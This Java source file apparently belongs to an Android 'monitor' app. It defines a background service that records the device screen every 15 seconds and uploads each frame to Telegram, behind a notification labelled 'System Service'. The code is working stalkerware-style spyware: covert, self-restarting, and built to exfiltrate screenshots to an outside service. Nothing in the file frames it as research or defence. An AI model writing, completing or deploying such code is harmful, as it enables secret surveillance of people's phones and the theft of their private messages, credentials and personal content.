package com.tom5.monitor;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.display.*;
import android.media.*;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createChannel();
        startForeground(1, new NotificationCompat.Builder(this, "core")
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build());

        if (intent != null && intent.hasExtra("resData")) {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(intent.getIntExtra("resCode", -1), (Intent) intent.getParcelableExtra("resData"));
            startCapture();
        }
        return START_STICKY;
    }

    private void startCapture() {
        DisplayMetrics dm = new DisplayMetrics();
        ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getMetrics(dm);
        imageReader = ImageReader.newInstance(dm.widthPixels / 2, dm.heightPixels / 2, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Cap", dm.widthPixels / 2, dm.heightPixels / 2, dm.densityDpi, 16, imageReader.getSurface(), null, null);

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                capture();
                handler.postDelayed(this, 15000); // صورة كل 15 ثانية
            }
        }, 5000);
    }

    private void capture() {
        Image img = imageReader.acquireLatestImage();
        if (img == null) return;
        try {
            Image.Plane[] planes = img.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            Bitmap b = Bitmap.createBitmap(img.getWidth(), img.getHeight(), Bitmap.Config.ARGB_8888);
            b.copyPixelsFromBuffer(buffer);
            File f = new File(getCacheDir(), "t.jpg");
            try (FileOutputStream out = new FileOutputStream(f)) {
                b.compress(Bitmap.CompressFormat.JPEG, 30, out);
                TelegramSender.sendPhoto(f);
            }
            b.recycle();
        } catch (Exception ignored) {} finally {
            img.close(); // أهم سطر لمنع الكراش
        }
    }

    private void createChannel() {
        NotificationChannel c = new NotificationChannel("core", "Core", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(c);
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
